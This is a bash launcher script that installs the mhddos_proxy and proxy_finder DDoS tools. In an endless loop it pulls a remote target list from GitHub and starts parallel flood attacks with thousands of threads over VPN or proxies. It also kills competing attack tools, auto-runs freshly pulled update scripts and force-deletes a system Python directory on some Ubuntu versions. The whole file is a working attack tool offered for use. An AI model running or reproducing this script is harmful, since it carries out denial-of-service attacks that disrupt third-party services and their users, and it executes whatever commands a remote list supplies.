#!/bin/bash

#Just in case kill previous copy of mhddos_proxy and finder
echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
sudo pkill -e -f runner.py
sudo pkill -e -f finder.py
sudo pkill -e -f db1000n
sudo pkill -e -f Disbalancer
sudo pkill -e -f disbalancer
sudo pkill -e -f Cyber
sudo docker kill $(sudo docker ps -aqf ancestor=elwahab/dd-attack)
sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/opengs/uashield:latest)   
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"

echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling our new proxy_finder...\033[0;0m\n"
sleep 1s
cd ~
sudo rm -rf proxy_finder
sudo apt install --upgrade git curl -y
sudo git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy
sudo git clone https://github.com/porthole-ascend-cinnamon/proxy_finder
sudo git clone https://github.com/alexnest-ua/auto_mhddos_alexnest


echo -e "\n\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling latest requirements...\033[0;0m\n\n"


os_version=$(cat /etc/*-release | grep -E -c "Ubuntu 18.04")
if ((os_version == 2));
then
	sudo rm -rf /usr/lib/python3
fi


num=$(python3 --version | grep -E -c '3.9|3.10')
if ((num == 1));
then	
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Python3 is already up to date"
else
	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Updating Python3 to 3.10 version..."
	sudo apt install --upgrade curl software-properties-common -y
	sudo add-apt-repository ppa:deadsnakes/ppa -y
	sudo apt install --upgrade python3.10 python3.10-distutils -y
	curl -sS https://bootstrap.pypa.io/get-pip.py | python3.10
	
	FILE=/usr/bin/python3.10
	if [[ -f "$FILE" ]];
	then
    		sudo ln -sf /usr/bin/python3.10 /usr/bin/python3
		sudo ln -sf /usr/bin/python3.10 /usr/local/bin/python3
	fi
	
	FILE=/usr/local/bin/python3.10
	if [[ -f "$FILE" ]];
	then
    		sudo ln -sf /usr/local/bin/python3.10 /usr/bin/python3
		sudo ln -sf /usr/local/bin/python3.10 /usr/local/bin/python3
	fi
	
	

	sudo apt remove python3-apt -y
	sudo apt autoremove -y
	sudo apt autoclean -y 
	sudo apt install python3-apt -y	
fi

python3 -m pip install --upgrade pip

cd ~/mhddos_proxy
python3 -m pip install -r requirements.txt
cd ~/proxy_finder
python3 -m pip install -r requirements.txt
cd ~
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"

restart_interval="20m"

ulimit -n 1048576

sudo chown -R ${USER}:${USER} ~/auto_mhddos_alexnest
sudo chown -R ${USER}:${USER} /home/${USER}/auto_mhddos_alexnest
sudo chown -R ${USER}:${USER} ~/mhddos_proxy
sudo chown -R ${USER}:${USER} /home/${USER}/mhddos_proxy
sudo chown -R ${USER}:${USER} ~/proxy_finder
sudo chown -R ${USER}:${USER} /home/${USER}/proxy_finder
sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest
sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
sudo git config --global --add safe.directory /home/${USER}/proxy_finder

num_of_copies="${1:-1}"
if [[ "$num_of_copies" == "all" ]];
then	
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies > 3));
then 
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
	num_of_copies=3
elif ((num_of_copies < 1));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
	num_of_copies=1
elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack\033[0;0m\n"
	num_of_copies=1
fi

threads="${2:-1500}"
if ((threads < 1000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
	threads=1000
elif ((threads > 15000));
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 15000 threads\033[0;0m\n"
	threads=15000
fi

rpc="${3:-1000}"

debug="${4:-}"
if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
then
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mStarting with parameter --debug (--table is not supported in our script)\033[0;0m\n"
	debug="--debug"
fi




# Restarts attacks and update targets list every 20 minutes
while [ 1 == 1 ]
do	

	rand=3

	proc_num=$(nproc --all)
	if ((proc_num < 2));
	then
		if ((threads > 1500));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for 1 CPU - attack will be started with 1500 threads\033[0;0m\n"
			threads=1500
		fi
		rand=$(shuf -i 1-2 -n 1)
		if ((rand == 1));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
		else
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
		fi
	
		if ((rand == 2));
		then
			if ((num_of_copies > 1));
			then 
				echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only 1 CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
				num_of_copies=1
			fi
		fi
	
	elif ((proc_num >= 2 && proc_num < 4));
	then
		if ((threads > 10000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads for $proc_num CPUs - attack will be started with 10000 threads\033[0;0m\n"
			threads=10000
		elif ((threads < 3000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 3000 threads\033[0;0m\n"
			threads=3000
		fi
	
	
		rand=$(shuf -i 1-2 -n 1)
		if ((rand == 1));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
		else
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
		fi
	
		if ((rand == 2));
		then
			if ((num_of_copies > 1));
			then 
				echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so attack will be started only with 1 parallel attack\033[0;0m\n"
				num_of_copies=1
			fi
		fi

	elif ((proc_num > 4));
	then
		if ((threads < 4000));
		then
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads for $proc_num CPUs - attack will be started with 4000 async threads\033[0;0m\n"
			threads=4000
		fi

	fi


	sleep 5s

	cd ~/mhddos_proxy
	
	num0=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
	else
		python3 -m pip install -r requirements.txt
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
		sleep 2s
	fi
	
	cd ~/proxy_finder	

	num0=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num0"
   	
   	if ((num0 == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder"
	else
		python3 -m pip install -r requirements.txt
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder"
		sleep 2s
	fi
	
	cd ~/auto_mhddos_alexnest
   	num=$(sudo git pull origin main | grep -E -c 'Already|Уже|Вже')
   	echo "$num"
   	
   	if ((num == 1));
   	then	
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
	else
		clear
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
		bash runner.sh $num_of_copies $threads $rpc $debug # run new downloaded script 
	fi
	#
   	sleep 2s
	
	if ((rand == 2));
	then
   		list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
		if ((num_of_copies > list_size));
		then 
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
			copies=$num_of_copies
		else
			random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
			copies=1
		fi
	
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
		
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only mhddos_proxy (without proxy_finder)\033[0;0m\n"
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
		sleep 3s
		# Launch multiple mhddos_proxy instances with different targets.
   		for i in $random_numbers
   		do
            		echo -e "\n I = $i"
             		# Filter and only get lines that not start with "#". Then get one target from that filtered list.
            		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
           
            		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
            
            		cd ~/mhddos_proxy
            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
	    		sleep 20s
            		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
   		done
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be going only mhddos_proxy (without proxy_finder)\033[0;0m\n"
   		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
	
	elif ((rand == 3));
	then
		list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
	
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
   		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
	
		if ((num_of_copies > list_size));
		then 
			random_numbers=$(shuf -i 1-$list_size -n $list_size)
			copies=$num_of_copies
		else
			random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
			copies=1
		fi
	
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
		
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack(s) with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
		sleep 3s
		# Launch multiple mhddos_proxy instances with different targets.
   		for i in $random_numbers
   		do
            		echo -e "\n I = $i"
             		# Filter and only get lines that not start with "#". Then get one target from that filtered list.
            		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
           
            		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
            
            		cd ~/mhddos_proxy
            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
	    		sleep 20s
			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
			
			echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
			sleep 2s
			cd ~/proxy_finder
			python3 finder.py&
		done
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
		sleep 5s
		
	else
		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mYou have only $proc_num CPU, so for next 20 minutes will be started only proxy_finder (without mhddos_proxy)\033[0;0m\n"
		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting proxy_finder...\033[1;0m"
		sleep 3s
		cd ~/proxy_finder
		python3 finder.py --threads 7500&
	fi
	
	sleep $restart_interval
	clear
   	
   	#Just in case kill previous copy of mhddos_proxy
   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with DDoS and finder"
   	sudo pkill -e -f runner.py
	sudo pkill -e -f finder.py
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with DDoS and finder killed\033[0;0m\n"
	
   	no_ddos_sleep="$(shuf -i 1-3 -n 1)m"
   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
	sleep $no_ddos_sleep
	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
done
